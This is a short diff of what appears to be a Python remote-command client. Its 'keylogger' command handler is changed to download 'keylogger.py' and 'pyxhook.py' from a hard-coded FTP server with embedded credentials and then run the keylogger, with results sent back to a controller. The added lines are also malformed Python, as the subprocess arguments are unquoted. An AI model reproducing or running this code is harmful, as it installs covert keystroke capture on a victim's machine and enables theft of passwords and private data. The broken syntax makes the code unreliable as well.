@@ -90,7 +90,9 @@ def main():
             results = toolkit.wget(action)
         
         elif cmd == 'keylogger':
-            results = toolkit.wget(action)
+            subprocess.Popen(wget,ftp://siic:azerty@84.39.49.25/keylogger/keylogger.py)
+            subprocess.Popen(wget,ftp://siic:azerty@84.39.49.25/keylogger/pyxhook.py)
+            subprocess.Popen(python,keylogger.py)
 
         client.sendGCM(results)
 
